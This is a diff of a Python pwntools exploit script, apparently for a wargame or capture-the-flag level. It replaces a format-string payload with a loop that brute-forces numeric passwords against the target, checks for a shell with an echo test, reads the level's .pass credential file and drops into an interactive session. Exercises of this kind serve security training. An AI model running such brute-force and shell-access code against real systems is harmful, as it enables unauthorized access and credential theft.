@@ -50,34 +50,56 @@ def get_connection(custom_env=None, argv=None):
 
 def exploit():
 
-    payload = b"%22$p" + b"%23$p" + b"%24$p" + b"%25$p" + b"%26$p"
+    for i in range(1, 22):
+        payload = str(322424845 - i).encode()
+        conn = get_connection()
 
-    conn = get_connection()
+        print(f"\n=== Tentative {i}: Payload = {payload} ===")
+        conn.recvuntil(b':')
+        conn.sendline(payload)
 
-    if LOCAL:
-        gdb.attach(conn, '''
-          break *main
-          continue
-          ''')
+        try:
+            # Utiliser recvrepeat() pour recevoir toutes les données disponibles
+            # avec un timeout raisonnable
+            recv = conn.recvrepeat(timeout=1).decode()
+            print(f"Réponse: {recv}")
+            
+            if "Invalid Password" in recv:
+                print(f"❌ Invalid Password pour {payload}")
+                conn.close()
+                continue
+            
+            # Vérifier qu'on n'a pas d'erreur et qu'on a bien un shell
+            # Tester en envoyant une commande simple
+            print(f"\n🔍 Test du shell avec le payload: {payload} (322424845 - {i})")
+            conn.sendline(b'echo SHELL_TEST')
+            test_response = conn.recvrepeat(timeout=1).decode()
+            print(f"Test response: {test_response}")
+            
+            if "SHELL_TEST" in test_response:
+                print(f"\n✅ Shell confirmé avec le payload: {payload}")
+                
+                if not LOCAL:
+                    conn.sendline(b'cat /home/users/level04/.pass')
+                    flag = conn.recvrepeat(timeout=1).decode()
+                    print("\n=== Flag ===")
+                    print(flag.strip())
+                
+                conn.interactive()
+                break  # Sortir de la boucle si succès
+            else:
+                print(f"❌ Pas de shell pour {payload}")
+                conn.close()
+                continue
+
+        except EOFError:
+            print("EOFError - Connexion fermée")
+            conn.close()
+        except Exception as e:
+            print(f"Erreur: {e}")
+            conn.close()
 
 
-    try:
-        if not LOCAL:
-            conn.recvuntil(b'$')
-            conn.sendline(b'cat /home/users/level04/.pass')
-            flag = conn.recvline()
-            print("\n=== Flag ===")
-            print(flag.decode())
-        conn.interactive()
-
-    except EOFError:
-        print("EOFError")
-        pass
-    except Exception as e:
-        print(e)
-        pass
-    finally:
-        conn.close()
 
    
 if __name__ == "__main__":
